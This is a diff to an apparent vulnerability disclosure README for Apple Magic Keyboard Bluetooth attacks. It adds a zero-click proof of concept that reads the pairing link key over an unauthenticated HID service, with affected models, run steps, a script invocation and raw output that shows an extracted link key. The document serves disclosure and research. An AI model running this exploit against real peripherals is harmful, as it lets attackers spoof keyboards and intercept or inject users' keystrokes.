@@ -576,7 +576,7 @@ The following Apple peripherals were tested and found vulnerable to this attack.
 
 #### Starting State
 
-- Magic Keyboard is paired with a Mac that does not in Lockdown Mode enabled
+- Magic Keyboard is paired with a Mac that does not have Lockdown Mode enabled
 - The attacker knows the Bluetooth address and serial number of the Magic Keyboard
 - The attacker as a donor Magic Keyboard (which will be temporarily reconfigured to spoof the target keyboard)
 
@@ -601,13 +601,148 @@ options:
 #### Output
 
 ```
-[2024-01-08 10:34:53.910]  Turn on the donor keyboard and plug it into this computer
-[2024-01-08 10:34:58.200]  changing Bluetooth address from 3C:A6:F6:E1:3D:F0 to 1c:57:fc:08:65:12
-[2024-01-08 10:34:58.201]  serial number: F0T230C02AZ0NC1EH -> F1T2107RUNW12NXA9
-[2024-01-08 10:34:58.202]  Unplug the donor keyboard and plug it into the Mac.
-[2024-01-08 10:34:58.202]  Wait a few seconds, then plug it back into this computer.
-[2024-01-08 10:35:02.533]  keyboard was unplugged
-[2024-01-08 10:35:13.463]  keyboard has returned
-[2024-01-08 10:35:13.464]  Mac BT Address - a4:c3:99:e8:a8:6c
-[2024-01-08 10:35:13.464]  BT Link-Key    - c95e3ec98809f2745d32029e7f97b67e
+[2024-01-07 10:34:53.910]  Turn on the donor keyboard and plug it into this computer
+[2024-01-07 10:34:58.200]  changing Bluetooth address from 3C:A6:F6:E1:3D:F0 to 1c:57:fc:08:65:12
+[2024-01-07 10:34:58.201]  serial number: F0T230C02AZ0NC1EH -> F1T2107RUNW12NXA9
+[2024-01-07 10:34:58.202]  Unplug the donor keyboard and plug it into the Mac.
+[2024-01-07 10:34:58.202]  Wait a few seconds, then plug it back into this computer.
+[2024-01-07 10:35:02.533]  keyboard was unplugged
+[2024-01-07 10:35:13.463]  keyboard has returned
+[2024-01-07 10:35:13.464]  Mac BT Address - a4:c3:99:e8:a8:6c
+[2024-01-07 10:35:13.464]  BT Link-Key    - c95e3ec98809f2745d32029e7f97b67e
+```
+
+### Magic Keyboard Link Key via Bluetooth
+
+When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.
+
+The link key remains in memory until the Magic Keyboard is powered off, and can be read via an unauthenticated Bluetooth HID service on the keyboard.
+
+The unauthenticated Bluetooth HID service becomes available when the Magic Keyboard is unplugged from the Mac, and remains available until the Bluetooth link is established.
+
+This is a zero-click attack with a timing component. The PoC does not implement a timing trigger, and instead attempts to connect to the Magic Keyboard in a loop until successful.
+
+#### Affected Versions
+
+The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.
+
+| Product Name | Model Number |
+|-|-|
+| Magic Keyboard | A2450 |
+| Magic Keyboard with Touch ID | A2449 |
+| Magic Keyboard with Numeric Keypad | A1843 |
+| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
+| Magic Mouse | A1657 |
+
+#### Starting State
+
+- Magic Keyboard is powered on and plugged into the Mac
+
+#### Running the PoC
+
+Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable, then run the script. Once the script is running, unplug the keyboard from the Mac.
+
+When the keyboard is unplugged, there is a race to connect to the keyboard between the attacker machine and the Mac.
+
+The PoC will typically connect to the Magic Keyboard either ~5 or ~25 seconds after the keyboard is unplugged from the Mac. Sometimes the Mac will win the race, and when it does, the PoC will not complete.
+
+```
+./read-link-key-lightning.py <Magic-Keyboard-BT-Address>
+```
+
+#### Invocation
+
+```
+./read-link-key-bluetooth.py 1c:57:dc:88:55:02
+```
+
+#### Output
+
+```
+[2024-01-07 13:09:59.311] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:00.313] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:00.314] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:00.316] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:00.318] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:01.359] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:01.361] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:01.362] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:01.364] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:02.407] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:02.408] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:02.410] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:02.411] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:03.448] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:03.449] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:03.451] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:03.452] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:04.512] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:04.513] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:04.515] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:04.516] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:05.568] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:05.569] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:05.638] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:05.640] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:06.680] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:06.681] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:07.682] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:07.684] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:08.685] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:08.687] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:09.689] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:09.690] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:10.691] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:10.693] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:11.694] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:11.696] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:12.697] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:12.699] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:13.700] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:13.702] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:14.704] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:14.705] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:15.707] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:15.708] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:16.709] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:16.711] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:17.712] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:17.714] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:18.715] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:18.717] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:19.719] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:19.720] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:20.722] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:20.723] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:21.725] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:21.726] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:22.728] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:22.729] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:23.731] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:23.732] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:24.734] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:24.735] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:25.737] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:25.738] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:26.739] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:26.741] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:26.824] ERROR connecting on port 17: [Errno 22] Invalid argument
+[2024-01-07 13:10:26.826] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:27.868] ERROR connecting on port 17: timed out
+[2024-01-07 13:10:27.869] connecting to 1c:57:dc:88:55:02 on port 17
+[2024-01-07 13:10:28.262] SUCCESS! connected on port 17
+[2024-01-07 13:10:28.264] connecting to 1c:57:dc:88:55:02 on port 19
+[2024-01-07 13:10:28.290] SUCCESS! connected on port 19
+[2024-01-07 13:10:28.291] [TX-17] 53ff34
+[2024-01-07 13:10:28.346] [RX-17] 00
+[2024-01-07 13:10:28.346] [TX-17] 43f0
+[2024-01-07 13:10:28.414] [RX-17] a3f0340347011c57dc88550200254000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+[2024-01-07 13:10:28.414] [TX-17] 53ff35
+[2024-01-07 13:10:28.458] [RX-17] 00
+[2024-01-07 13:10:28.458] [TX-17] 43f0
+[2024-01-07 13:10:28.498] [RX-17] a3f035010150de06a8e1ca80b480523b23bbff5ea40c52e88f1905
+Model     0    - Magic Keyboard
+BT Address     - 1c:57:dc:88:55:02
+Mac BT Address - 50:de:06:a8:e1:ca
+BT Link Key    - 05198fe8520ca45effbb233b5280b480
 ```
